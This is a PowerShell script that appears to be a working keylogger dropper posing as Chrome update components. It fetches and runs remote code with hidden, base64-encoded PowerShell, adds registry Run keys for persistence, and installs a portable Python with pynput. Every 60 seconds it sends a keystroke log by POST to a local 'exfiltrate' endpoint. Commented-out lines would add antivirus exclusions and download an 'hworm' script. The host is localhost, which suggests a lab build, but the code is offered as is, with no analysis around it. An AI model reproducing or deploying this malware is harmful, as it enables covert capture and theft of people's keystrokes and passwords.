
if (!(Test-Path -Path "C:\Users\Public\chrome_browser")) {
    New-Item -Path "C:\Users\Public\chrome_browser" -ItemType Directory
}

# Copy-Item -Path "C:\Windows\Temp\chrome_update.ps1" -Destination "C:\Program Files\chrome_browser\chrome_update.ps1" -ItemType File -Force
# Invoke-WebRequest -Uri "http://localhost:8080/hworm.ps1" -OutFile "C:\Program Files\chrome_browser\hworm.ps1"

# Add-MpPreference -ExclusionPath "C:\Program Files\chrome_browser\chrome_update.ps1"
# Add-MpPreference -ExclusionPath "C:\Program Files\chrome_browser\hworm.ps1"
# Add-MpPreference -ExclusionProcess "C:\Program Files\chrome_browser\chrome_update.ps1"
# Add-MpPreference -ExclusionProcess "C:\Program Files\chrome_browser\hworm.ps1"

$CHROME_UPDATE_URL = "http://localhost:8080/chrome_update.ps1"

$Chrome_Update = "powershell -nop -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString($($CHROME_UPDATE_URL))'"

$Chrome_Service = @"
Invoke-WebRequest -Uri 'http://localhost:8080/chrome_service' -OutFile "C:\Temp\chrome_service.py"
Start-Process 'C:\Users\Public\chrome_browser\pythonw.exe' -ArgumentList "C:\Temp\chrome_service.py" -WindowStyle Hidden
Start-Sleep -Seconds 15
Remove-Item "C:\Temp\chrome_service.py" -Force
"@

$Command_Bytes = [System.Text.Encoding]::Unicode.GetBytes($Chrome_Service)
$Chrome_Service_Encoded = [Convert]::ToBase64String($Command_Bytes)
$Chrome_Service_Command = "powershell -nop -w hidden -EncodedCommand $Chrome_Service_Encoded"

$Command_Bytes = [System.Text.Encoding]::Unicode.GetBytes($Chrome_Update)
$Chrome_Update_Encoded = [Convert]::ToBase64String($Command_Bytes)
$Chrome_Update_Command = "powershell -nop -w hidden -EncodedCommand $Chrome_Update_Encoded"

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gchrome_service.exe" -Value "$Chrome_Service_Command" -PropertyType String -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gchrome_update_service.exe" -Value "$Chrome_Update_Command" -PropertyType String -Force

# Install Python 3.11.0
if (!(Test-Path -Path "C:\Users\Public\chrome_browser\pythonw.exe")) {
    $TargetDir = "C:\Users\Public\chrome_browser"
    $ZipPath   = "C:\temp\python-3.13.7-embed-amd64.zip"

    # Create target folder if it doesn't exist
    if (!(Test-Path -Path $TargetDir)) {
        New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null
    }

    # Download the embeddable distribution
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.13.7/python-3.13.7-embed-amd64.zip" -OutFile $ZipPath

    # Extract to your chosen directory
    Expand-Archive -Path $ZipPath -DestinationPath $TargetDir -Force

    # Clean up
    Remove-Item $ZipPath -Force

    # Path to _pth file, e.g. python313._pth
    $PthFile = "C:\Users\Public\chrome_browser\python313._pth"

    # Uncomment or add the line
    (Get-Content $PthFile) -replace '#import site','import site' | Set-Content $PthFile

    $GetPip = "C:\Users\Public\chrome_browser\get-pip.py"

    # Download get-pip.py
    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $GetPip

    # Run get-pip.py with portable Python
    & "C:\Users\Public\chrome_browser\python.exe" $GetPip

    # Clean up
    Remove-Item $GetPip -Force

    & "C:\Users\Public\chrome_browser\python.exe" -m pip install --upgrade pip
    & "C:\Users\Public\chrome_browser\python.exe" -m pip install requests pynput
    
}

# Run keylogger and exfiltrate data every 60 seconds
& "C:\Users\Public\chrome_browser\pythonw.exe" -m pip install --upgrade pip; & "C:\Users\Public\chrome_browser\pythonw.exe" -m pip install pynput requests
Start-Process -FilePath "powershell.exe" -ArgumentList "$Chrome_Service_Command" -WindowStyle Hidden

while ($true) {
    $Data = Get-Content -Path "C:\temp\keylog.txt" -Raw

    # Remove newlines and extra spaces, then join into words
    $Words = ($Data -replace "`r`n|`n|`r", " ") -replace "\s+", " "

    $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Words))
    Invoke-WebRequest -Uri "http://localhost:8080/exfiltrate" -UseBasicParsing -Method POST -Body ($EncodedData) -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 60
}